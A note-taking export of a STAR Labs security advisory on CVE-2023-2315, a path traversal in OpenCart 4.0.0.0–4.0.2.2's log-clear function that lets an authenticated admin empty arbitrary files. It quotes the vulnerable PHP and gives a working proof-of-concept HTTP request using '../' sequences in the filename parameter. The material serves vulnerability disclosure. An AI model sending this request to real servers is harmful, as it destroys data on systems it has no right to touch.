---
author: STAR Labs
aliases:
  - (CVE-2023-2315) Path Traversal in OpenCart Versions 4.0.0.0 to 4.0.2.2
tags:
  - readwise/articles
  - opencart
  - vulnerability-research/finished
url: https://starlabs.sg/advisories/23/23-2315/
date: 2024-08-20
category:
  - Web
last-time: 2024-08-20
---
# (CVE-2023-2315) Path Traversal in OpenCart Versions 4.0.0.0 to 4.0.2.2

![rw-book-cover](https://starlabs.sg/logo-white.png)

## Highlights


> Path traversal in Opencart versions 4.0.0.0 to 4.0.2.2 allows authenticated backend users to empty any existing file on the server with write permissions.
> [View Highlight](https://read.readwise.io/read/01hbtz770ryfnn3ydpz85a81v7)
> #advisory  

# PoC

*admin\controller\tool\log.php*

```php title:"admin\controller\tool\log.php"
class Log extends \Opencart\System\Engine\Controller {
...
public function clear(): void {
	if (isset($this->request->get['filename'])) {
            $filename = (string)$this->request->get['filename'];
        } else {
            $filename = '';
        }
	...
	$file = DIR_LOGS . $filename;
        if (!is_file($file)) {
            $json['error'] = sprintf($this->language->get('error_file'), $filename);
        }
        if (!$json) {
            $handle = fopen($file, 'w+');
            fclose($handle);
            $json['success'] = $this->language->get('text_success');
        }
        ...
```

The application does not manage  the `filename` field and allows to delete arbitrary files.



```http
GET /opencart-latest/admin/index.php?route=tool/log.clear&user_token=40cc3d40e897751f863b18ea52eaa3e9&filename=../../../../../../../../dev/shm/PoC.txt HTTP/1.1
Host: 127.0.0.1
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Referer: http://127.0.0.1/opencart-latest/admin/index.php?route=tool/log&user_token=40cc3d40e897751f863b18ea52eaa3e9
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: OCSESSID=fbc47c7e5098550f0c12070be0
Connection: close


HTTP/1.1 200 OK
```